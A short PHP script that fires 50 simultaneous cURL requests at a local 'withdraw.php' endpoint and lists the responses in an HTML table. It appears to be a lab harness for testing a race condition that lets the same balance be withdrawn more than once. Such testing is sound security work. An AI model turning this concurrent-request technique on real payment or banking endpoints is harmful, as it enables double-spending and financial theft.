<?php
$url = "http://localhost/withdraw.php";
$multiCurl = [];
$mh = curl_multi_init();
$responses = [];

for ($i = 0; $i < 50; $i++) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [CURLOPT_RETURNTRANSFER => true, CURLOPT_TIMEOUT => 10]);
    curl_multi_add_handle($mh, $ch);
    $multiCurl[$i] = $ch;
}
do { curl_multi_exec($mh, $running); curl_multi_select($mh); } while ($running);

foreach ($multiCurl as $ch) {
    $response = curl_multi_getcontent($ch);
    $responses[] = curl_errno($ch) ? 'cURL Error: ' . curl_error($ch) : htmlspecialchars($response);
    curl_multi_remove_handle($mh, $ch);
    curl_close($ch);
}
curl_multi_close($mh);

echo '<style>body{font-size:24px;font-family:Arial,sans-serif;}table{width:100%;border-collapse:collapse;}table,th,td{border:1px solid black;}th,td{padding:15px;text-align:left;}th{background-color:#f2f2f2;}</style>
<table><tr><th>Request</th><th>Response</th></tr>';

foreach ($responses as $index => $response) {
    echo "<tr><td>Request " . ($index + 1) . "</td><td>$response</td></tr>";
}
echo '</table>';
?>
